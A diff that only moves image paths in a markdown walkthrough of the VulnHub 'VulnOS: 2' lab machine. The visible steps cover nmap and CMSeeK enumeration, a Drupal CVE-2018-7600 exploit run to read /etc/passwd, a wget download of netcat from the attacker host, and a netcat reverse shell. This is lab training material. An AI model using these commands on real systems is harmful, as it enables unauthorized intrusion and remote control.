@@ -3,7 +3,7 @@
 - **Machine:** VulnOS: 2
 - **Download:** https://www.vulnhub.com/entry/vulnos-2,147/
 
-![](704-1.png)
+![](images/704-1.png)
 
 ---
 
@@ -15,7 +15,7 @@
 7z e VulnOSv2.7z
 ```
 
-![](704-2.png)
+![](images/704-2.png)
 
 2. Double-click **VulnOSv2.vbox** to import the machine into VirtualBox.
 3. Start the virtual machine.
@@ -32,7 +32,7 @@ Identify the target machine on the local network.
 nmap -sn 192.168.31.0/24
 ```
 
-![](704-3.png)
+![](images/704-3.png)
 
 ---
 
@@ -44,7 +44,7 @@ Scan all TCP ports.
 nmap -v -p- 192.168.31.50
 ```
 
-![](704-4.png)
+![](images/704-4.png)
 
 ---
 
@@ -56,7 +56,7 @@ Identify running services, versions, operating system, and execute default NSE s
 nmap -sC -sV -A 192.168.31.50
 ```
 
-![](704-5.png)
+![](images/704-5.png)
 
 ---
 
@@ -68,7 +68,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.50
 ```
 
-![](704-6.png)
+![](images/704-6.png)
 
 ---
 
@@ -96,7 +96,7 @@ Discovered endpoint:
 http://192.168.31.50/jabc/
 ```
 
-![](704-7.png)
+![](images/704-7.png)
 
 ---
 
@@ -110,7 +110,7 @@ cmseek -v -u http://192.168.31.50/jabc/
 
 CMSeeK identifies the application as **Drupal**.
 
-![](704-8.png)
+![](images/704-8.png)
 
 ---
 
@@ -136,7 +136,7 @@ Launch the exploit in interactive mode.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/
 ```
 
-![](704-9.png)
+![](images/704-9.png)
 
 ---
 
@@ -148,7 +148,7 @@ Retrieve the operating system information.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c uname
 ```
 
-![](704-10.png)
+![](images/704-10.png)
 
 Retrieve detailed kernel information.
 
@@ -156,7 +156,7 @@ Retrieve detailed kernel information.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c 'uname -a'
 ```
 
-![](704-11.png)
+![](images/704-11.png)
 
 ---
 
@@ -168,7 +168,7 @@ Read the system user list.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c 'cat /etc/passwd'
 ```
 
-![](704-12.png)
+![](images/704-12.png)
 
 ---
 
@@ -186,7 +186,7 @@ Display CPU information.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c 'lscpu'
 ```
 
-![](704-13.png)
+![](images/704-13.png)
 
 ---
 
@@ -200,7 +200,7 @@ Host the payload from the attacker machine.
 python3 -m http.server 443
 ```
 
-![](704-14.png)
+![](images/704-14.png)
 
 ---
 
@@ -212,7 +212,7 @@ Transfer the Netcat binary to the target.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c 'wget http://192.168.31.206:443/nc32 -O /tmp/nc'
 ```
 
-![](704-15.png)
+![](images/704-15.png)
 
 ---
 
@@ -224,7 +224,7 @@ Confirm the binary exists.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ -c 'ls -lh /tmp/nc'
 ```
 
-![](704-16.png)
+![](images/704-16.png)
 
 ---
 
@@ -254,11 +254,11 @@ Run the downloaded Netcat binary to establish a reverse shell.
 python drupa7-CVE-2018-7600.py http://192.168.31.50/jabc/ --command '/tmp/nc -e /bin/bash 192.168.31.206 443'
 ```
 
-![](704-17.png)
+![](images/704-17.png)
 
 A reverse shell is successfully established.
 
-![](704-18.png)
+![](images/704-18.png)
 
 ---
 
